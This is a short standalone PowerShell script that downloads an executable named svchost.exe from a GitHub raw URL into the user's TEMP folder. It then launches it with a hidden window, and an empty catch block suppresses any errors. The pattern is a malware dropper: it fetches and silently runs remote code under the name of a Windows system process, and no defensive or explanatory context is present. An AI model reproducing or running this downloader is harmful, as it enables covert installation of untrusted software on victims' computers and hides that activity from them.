$exeUrl = "https://raw.githubusercontent.com/anton21-sketch/1234/main/svchost.exe"
$dest = "$env:TEMP\svchost.exe"

try {
    (New-Object Net.WebClient).DownloadFile($exeUrl, $dest)
    Start-Process $dest -WindowStyle Hidden
} catch {
    # ничего не делаем
}
